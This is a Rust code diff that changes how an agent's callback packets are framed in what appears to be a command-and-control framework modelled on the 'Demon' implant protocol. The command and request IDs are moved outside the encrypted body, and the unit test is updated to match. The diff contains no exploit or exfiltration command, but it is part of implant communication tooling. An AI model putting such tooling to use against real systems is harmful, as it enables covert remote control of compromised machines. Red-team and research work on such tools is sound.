@@ -110,10 +110,9 @@ pub fn build_callback_packet(
     request_id: u32,
     callback_payload: &[u8],
 ) -> Result<Vec<u8>, SpecterError> {
-    // Build the inner package: command_id(4) + request_id(4) + len(4) + payload
-    let mut plaintext = Vec::with_capacity(4 + 4 + 4 + callback_payload.len());
-    plaintext.extend_from_slice(&command_id.to_be_bytes());
-    plaintext.extend_from_slice(&request_id.to_be_bytes());
+    // Build the encrypted callback body: payload_len(4) + payload.
+    // The top-level command_id and request_id remain in the clear.
+    let mut plaintext = Vec::with_capacity(4 + callback_payload.len());
     let payload_len = u32::try_from(callback_payload.len()).map_err(|_| {
         SpecterError::Protocol(red_cell_common::demon::DemonProtocolError::LengthOverflow {
             context: "callback payload",
@@ -125,7 +124,12 @@ pub fn build_callback_packet(
 
     let encrypted =
         encrypt_agent_data_at_offset(&crypto.key, &crypto.iv, block_offset, &plaintext)?;
-    let envelope = DemonEnvelope::new(agent_id, encrypted)?;
+    let mut body = Vec::with_capacity(8 + encrypted.len());
+    body.extend_from_slice(&command_id.to_be_bytes());
+    body.extend_from_slice(&request_id.to_be_bytes());
+    body.extend_from_slice(&encrypted);
+
+    let envelope = DemonEnvelope::new(agent_id, body)?;
     Ok(envelope.to_bytes())
 }
 
@@ -449,16 +453,15 @@ mod tests {
 
         let envelope = DemonEnvelope::from_bytes(&packet).expect("parse");
         assert_eq!(envelope.header.agent_id, agent_id);
-
-        // Decrypt the payload
-        let decrypted =
-            decrypt_agent_data(&crypto.key, &crypto.iv, &envelope.payload).expect("decrypt");
-        let cmd = u32::from_be_bytes(decrypted[0..4].try_into().expect("cmd"));
-        let req = u32::from_be_bytes(decrypted[4..8].try_into().expect("req"));
-        let plen = u32::from_be_bytes(decrypted[8..12].try_into().expect("len")) as usize;
+        let cmd = u32::from_be_bytes(envelope.payload[0..4].try_into().expect("cmd"));
+        let req = u32::from_be_bytes(envelope.payload[4..8].try_into().expect("req"));
         assert_eq!(cmd, command_id);
         assert_eq!(req, request_id);
-        assert_eq!(&decrypted[12..12 + plen], payload_data);
+
+        let decrypted =
+            decrypt_agent_data(&crypto.key, &crypto.iv, &envelope.payload[8..]).expect("decrypt");
+        let plen = u32::from_be_bytes(decrypted[0..4].try_into().expect("len")) as usize;
+        assert_eq!(&decrypted[4..4 + plen], payload_data);
     }
 
     #[test]
